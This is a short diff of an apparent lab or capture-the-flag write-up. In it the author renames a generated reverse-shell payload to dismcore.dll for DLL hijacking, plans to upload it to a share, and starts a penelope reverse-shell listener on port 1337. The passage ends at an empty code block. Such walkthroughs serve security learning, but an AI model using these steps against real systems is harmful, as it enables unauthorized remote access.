@@ -568,4 +568,20 @@ Payload size: 460 bytes
 Final size of dll file: 9216 bytes
 Saved as: reverse.dll
 ```
-This generated the payload but now im realising it 
+This generated the payload but now im realising it needs to be called dismcore.dll
+
+```python
+mv reverse.dll dismcore.dll
+```
+Now i can upload it to the share
+
+```python
+penelope -p 1337                                        
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.1.157 • 10.200.50.211
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+```
+First ill start a listener
+
+```python
+
+```
